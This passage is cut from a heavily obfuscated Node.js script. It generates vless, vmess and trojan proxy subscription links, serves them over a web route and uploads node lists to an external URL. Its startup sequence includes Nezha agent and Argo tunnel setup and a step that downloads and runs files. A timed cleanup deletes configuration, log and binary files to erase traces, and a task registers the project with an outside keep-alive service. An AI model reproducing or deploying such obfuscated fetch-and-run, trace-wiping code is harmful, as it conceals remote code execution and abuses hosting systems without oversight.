_0x1f80a2[_0x4fea2f(_0x5f0023._0x4472d3)]['countryCode']+'_'+_0x1f80a2[_0x4fea2f(0x173)][_0x4fea2f(0x136)];}catch(_0x2023f8){}}return'Unknown';}async function _0x55bc73(_0x36041e){const _0x3b669e={_0x764ac9:0x171,_0x2c4dfd:0x134,_0x2c0151:0x169,_0x52489c:0x182,_0x63bcb0:0x180,_0xc20b12:0x141,_0x454dfe:0xea,_0x471c3f:0x149,_0x582c47:0x10c,_0x4835a6:0x14b,_0x4a49a2:0x100,_0x31b90d:0x141,_0x2e43ab:0x10c,_0x338b4b:0x145,_0x4a3d2f:0xfd},_0x1f35b8=await _0xca90f1(),_0x1b9edd=NAME?NAME+'-'+_0x1f35b8:_0x1f35b8;return new Promise(_0xf87054=>{setTimeout(()=>{const _0x4166a7={_0x18fd1a:0x100},_0x5c4283=_0x5231,_0x56832c={'v':'2','ps':''+_0x1b9edd,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5c4283(_0x3b669e._0x764ac9),'net':'ws','type':_0x5c4283(0x171),'host':_0x36041e,'path':_0x5c4283(_0x3b669e._0x2c4dfd),'tls':_0x5c4283(0x115),'sni':_0x36041e,'alpn':'','fp':'firefox'},_0x273ef8=_0x5c4283(_0x3b669e._0x2c0151)+UUID+'@'+CFIP+':'+CFPORT+_0x5c4283(_0x3b669e._0x52489c)+_0x36041e+_0x5c4283(0x10f)+_0x36041e+_0x5c4283(0x155)+_0x1b9edd+'\x0a\x0avmess://'+Buffer[_0x5c4283(0x100)](JSON[_0x5c4283(_0x3b669e._0x63bcb0)](_0x56832c))[_0x5c4283(_0x3b669e._0xc20b12)]('base64')+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x5c4283(_0x3b669e._0x454dfe)+_0x36041e+'&fp=firefox&type=ws&host='+_0x36041e+_0x5c4283(_0x3b669e._0x471c3f)+_0x1b9edd+'\x0a\x20\x20\x20\x20';console[_0x5c4283(_0x3b669e._0x582c47)](Buffer[_0x5c4283(0x100)](_0x273ef8)[_0x5c4283(_0x3b669e._0xc20b12)](_0x5c4283(0x17d))),fs[_0x5c4283(_0x3b669e._0x4835a6)](subPath,Buffer[_0x5c4283(_0x3b669e._0x4a49a2)](_0x273ef8)[_0x5c4283(_0x3b669e._0x31b90d)](_0x5c4283(0x17d))),console[_0x5c4283(_0x3b669e._0x2e43ab)](FILE_PATH+_0x5c4283(_0x3b669e._0x338b4b)),uploadNodes(),app[_0x5c4283(_0x3b669e._0x4a3d2f)]('/'+SUB_PATH,(_0x1eefdd,_0x5bb594)=>{const _0x437d7e=_0x5c4283,_0x30b47f=Buffer[_0x437d7e(_0x4166a7._0x18fd1a)](_0x273ef8)['toString'](_0x437d7e(0x17d));_0x5bb594[_0x437d7e(0x103)](_0x437d7e(0x12d),_0x437d7e(0x174)),_0x5bb594['send'](_0x30b47f);}),_0xf87054(_0x273ef8);},0x7d0);});}}async function uploadNodes(){const _0x483170={_0x568aa8:0x125,_0x46d0cb:0x110,_0x2c14cb:0x19a,_0x31e514:0x10c,_0x5590e9:0x191,_0x2f4fb8:0x13d,_0x15c86a:0x13d,_0x3bec42:0x175,_0xb5ea59:0x18a,_0x1180b0:0xdf,_0x322c7f:0x180},_0x476e20=_0x1045c6;if(UPLOAD_URL&&PROJECT_URL){const _0x32ce8f=PROJECT_URL+'/'+SUB_PATH,_0x5e98a1={'subscription':[_0x32ce8f]};try{const _0x413b4d=await axios[_0x476e20(_0x483170._0x568aa8)](UPLOAD_URL+_0x476e20(_0x483170._0x46d0cb),_0x5e98a1,{'headers':{'Content-Type':_0x476e20(_0x483170._0x2c14cb)}});return _0x413b4d&&_0x413b4d[_0x476e20(0x175)]===0xc8?(console[_0x476e20(_0x483170._0x31e514)](_0x476e20(_0x483170._0x5590e9)),_0x413b4d):null;}catch(_0xa3668c){if(_0xa3668c[_0x476e20(_0x483170._0x2f4fb8)]){if(_0xa3668c[_0x476e20(_0x483170._0x15c86a)][_0x476e20(_0x483170._0x3bec42)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x476e20(0x130)](listPath))return;const _0x4bd128=fs[_0x476e20(_0x483170._0xb5ea59)](listPath,_0x476e20(0x177)),_0x2ab40b=_0x4bd128['split']('\x0a')['filter'](_0x375929=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x476e20(0x1a4)](_0x375929));if(_0x2ab40b[_0x476e20(_0x483170._0x1180b0)]===0x0)return;const _0x2fe8c5=JSON[_0x476e20(_0x483170._0x322c7f)]({'nodes':_0x2ab40b});try{const _0xdf930e=await axios[_0x476e20(0x125)](UPLOAD_URL+_0x476e20(0x18b),_0x2fe8c5,{'headers':{'Content-Type':'application/json'}});return _0xdf930e&&_0xdf930e[_0x476e20(0x175)]===0xc8?(console[_0x476e20(0x10c)](_0x476e20(0x102)),_0xdf930e):null;}catch(_0x1d0a9b){return null;}}else return;}}function cleanFiles(){const _0x55f8d1={_0x232185:0x153,_0x5d70cc:0x13f,_0x423f70:0x127,_0x3494e1:0x113,_0x39463a:0xe4},_0x29197c={_0x5e2a4c:0x195,_0x3e4ecd:0x10c};setTimeout(()=>{const _0x80eae4=_0x5231,_0x46f2b6=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x46f2b6[_0x80eae4(_0x55f8d1._0x232185)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x46f2b6[_0x80eae4(0x153)](phpPath);process[_0x80eae4(0x183)]===_0x80eae4(_0x55f8d1._0x5d70cc)?exec(_0x80eae4(_0x55f8d1._0x423f70)+_0x46f2b6[_0x80eae4(0x15c)]('\x20')+_0x80eae4(_0x55f8d1._0x3494e1),_0x39fd32=>{const _0x17a3c9=_0x80eae4;console[_0x17a3c9(0x195)](),console[_0x17a3c9(0x10c)](_0x17a3c9(0x1a3)),console[_0x17a3c9(0x10c)](_0x17a3c9(0x118));}):exec(_0x80eae4(_0x55f8d1._0x39463a)+_0x46f2b6[_0x80eae4(0x15c)]('\x20')+_0x80eae4(0x160),_0x59ade6=>{const _0x48f79a=_0x80eae4;console[_0x48f79a(_0x29197c._0x5e2a4c)](),console[_0x48f79a(0x10c)](_0x48f79a(0x1a3)),console[_0x48f79a(_0x29197c._0x3e4ecd)](_0x48f79a(0x118));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xc4219f={_0x122b78:0x19c,_0x2f62e5:0x128,_0x524322:0x19a,_0x613af1:0x114},_0x2c5204=_0x1045c6;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2c5204(0x10c)](_0x2c5204(_0xc4219f._0x122b78));return;}try{const _0x3f563a=await axios[_0x2c5204(0x125)](_0x2c5204(_0xc4219f._0x2f62e5),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2c5204(_0xc4219f._0x524322)}});return console[_0x2c5204(0x10c)](_0x2c5204(0x10b)),_0x3f563a;}catch(_0x4345e4){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x4345e4[_0x2c5204(_0xc4219f._0x613af1)]),null;}}async function startserver(){const _0x3ad9fa={_0x36f2a8:0x162},_0x4b518d=_0x1045c6;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x19e9a9){console[_0x4b518d(_0x3ad9fa._0x36f2a8)]('Error\x20in\x20startserver:',_0x19e9a9);}}startserver()[_0x1045c6(0x16e)](_0x108de2=>{const _0x116a21={_0x462c59:0x162},_0x481ad3=_0x1045c6;console[_0x481ad3(_0x116a21._0x462c59)](_0x481ad3(0xf7),_0x108de2);}),app[_0x1045c6(0x151)](PORT,()=>console[_0x1045c6(0x10c)](_0x1045c6(0x11b)+PORT+'!'));
